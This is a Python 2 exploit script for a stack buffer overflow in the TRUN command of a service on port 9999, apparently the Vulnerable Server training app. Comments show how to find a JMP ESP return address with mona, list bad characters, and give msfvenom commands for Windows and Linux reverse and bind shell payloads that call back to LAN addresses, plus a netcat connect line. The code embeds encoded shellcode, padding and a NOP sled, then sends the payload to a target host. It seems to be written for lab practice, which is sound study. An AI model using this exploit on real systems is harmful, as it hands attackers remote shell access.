#!/usr/bin/python
import sys, socket

#mona
#/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
#JMP ESP 


#!mona modules 

#!mona find -s "\xff\xe4" -m modules_found

#copy the return address 

#search the return addr in immunity with blue button, check id it match with jmp esp code (ffe4) 
#and set a break point with f2. Run again the progam and check if EIP was really rewritten


#return address 62 50 11 AF => \xaf\x11\x50\x62
#return address 0x625011bb

#common bad char = '\x00\x0A\x0D' 

#shell
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.1 LPORT=1234 EXITFUNC=thread -f c -a x86 -b "\x00\x0A\x0D" -e x86/shikata_ga_nai

#msfvenom -p windows/shell_bind_tcp LPORT=1234 -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 3 -f python

#msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.0.51 LPORT=1234 EXITFUNC=thread -f py -a x86 --platform linux -b "\x00\x0A\x0D" -e x86/shikata_ga_nai


#nc -nv 192.168.1.11 1234

buf=("\xda\xd2\xbf\x60\xab\x9e\xa3\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\x8b\x57\x7c\x56\xb7\x40\x03"
"\x99\x47\x91\x64\x13\xa2\xa0\xa4\x47\xa7\x93\x14\x03\xe5\x1f"
"\xde\x41\x1d\xab\x92\x4d\x12\x1c\x18\xa8\x1d\x9d\x31\x88\x3c"
"\x1d\x48\xdd\x9e\x1c\x83\x10\xdf\x59\xfe\xd9\x8d\x32\x74\x4f"
"\x21\x36\xc0\x4c\xca\x04\xc4\xd4\x2f\xdc\xe7\xf5\xfe\x56\xbe"
"\xd5\x01\xba\xca\x5f\x19\xdf\xf7\x16\x92\x2b\x83\xa8\x72\x62"
"\x6c\x06\xbb\x4a\x9f\x56\xfc\x6d\x40\x2d\xf4\x8d\xfd\x36\xc3"
"\xec\xd9\xb3\xd7\x57\xa9\x64\x33\x69\x7e\xf2\xb0\x65\xcb\x70"
"\x9e\x69\xca\x55\x95\x96\x47\x58\x79\x1f\x13\x7f\x5d\x7b\xc7"
"\x1e\xc4\x21\xa6\x1f\x16\x8a\x17\xba\x5d\x27\x43\xb7\x3c\x20"
"\xa0\xfa\xbe\xb0\xae\x8d\xcd\x82\x71\x26\x59\xaf\xfa\xe0\x9e"
"\xd0\xd0\x55\x30\x2f\xdb\xa5\x19\xf4\x8f\xf5\x31\xdd\xaf\x9d"
"\xc1\xe2\x65\x31\x91\x4c\xd6\xf2\x41\x2d\x86\x9a\x8b\xa2\xf9"
"\xbb\xb4\x68\x92\x56\x4f\xfb\x5d\x0e\xcd\xfa\x35\x4d\xd1\xf8"
"\x17\xd8\x37\x6a\x88\x8d\xe0\x03\x31\x94\x7a\xb5\xbe\x02\x07"
"\xf5\x35\xa1\xf8\xb8\xbd\xcc\xea\x2d\x4e\x9b\x50\xfb\x51\x31"
"\xfc\x67\xc3\xde\xfc\xee\xf8\x48\xab\xa7\xcf\x80\x39\x5a\x69"
"\x3b\x5f\xa7\xef\x04\xdb\x7c\xcc\x8b\xe2\xf1\x68\xa8\xf4\xcf"
"\x71\xf4\xa0\x9f\x27\xa2\x1e\x66\x9e\x04\xc8\x30\x4d\xcf\x9c"
"\xc5\xbd\xd0\xda\xc9\xeb\xa6\x02\x7b\x42\xff\x3d\xb4\x02\xf7"
"\x46\xa8\xb2\xf8\x9d\x68\xd2\x1a\x37\x85\x7b\x83\xd2\x24\xe6"
"\x34\x09\x6a\x1f\xb7\xbb\x13\xe4\xa7\xce\x16\xa0\x6f\x23\x6b"
"\xb9\x05\x43\xd8\xba\x0f")

shellcode="A"*2003 + "\xaf\x11\x50\x62" + "\x90" *16 + buf
try: 

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.130.139',9999)) 
	s.recv(1024)
	s.send(('TRUN /.:/' + shellcode)) 

	s.close()

except:

	print "Error connecting to the server" 
	sys.exit()


